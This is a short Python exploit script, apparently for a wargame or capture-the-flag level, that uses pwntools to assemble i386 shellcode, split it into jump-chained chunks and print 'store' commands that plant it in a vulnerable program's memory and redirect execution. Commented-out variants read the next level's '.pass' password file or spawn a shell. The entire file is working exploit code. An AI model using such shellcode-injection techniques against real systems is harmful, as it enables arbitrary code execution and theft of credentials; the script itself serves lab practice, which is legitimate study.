import pwn
import re
import struct

# shell = pwn.shellcraft.i386.linux.cat('/home/users/level08/.pass')
shell = pwn.shellcraft.i386.linux.echo('lol')
# shell = pwn.shellcraft.i386.linux.cat('test')
# shell = pwn.shellcraft.i386.linux.sh()
shell = shell.split('\n')
size = 0
add = b''
index = 1
tt = b''
for line in shell:
	asm = pwn.asm(line)
	if (size + len(asm) > 6):
		add += b'\x90' * (6 - size)
		add += pwn.asm('jmp $+0x6')
		tt += add + b'\x00' * 4
		# print(add.hex())
		hexasm = re.findall('(.{8})', add.hex())
		for hexa in hexasm:
			hexa = re.findall('(.{2})', hexa)
			hexa.reverse()
			hexa = ''.join(hexa)
			print('store')
			print(int(hexa, 16))
			print(index)
			index += 1
			if index % 3 == 0:
				index += 1
		add = b''
		size = 0
	add += asm
	size += len(asm)
if size != 0:
	add += b'\x90' * (7 - size)
	add += pwn.asm('ret')
	tt += add 
	# print(add.hex())
	hexasm = re.findall('(.{8})', add.hex())
	for hexa in hexasm:
		print('store')
		print(int(hexa, 16))
		print(index)
		index += 1
		if index % 3 == 0:
			index += 1
# print('store')
# print(0xffffd458)
# print(-1040108826)
# print(pwn.disasm(tt))
print('store')
print('4294956120')
print('-1040108819')
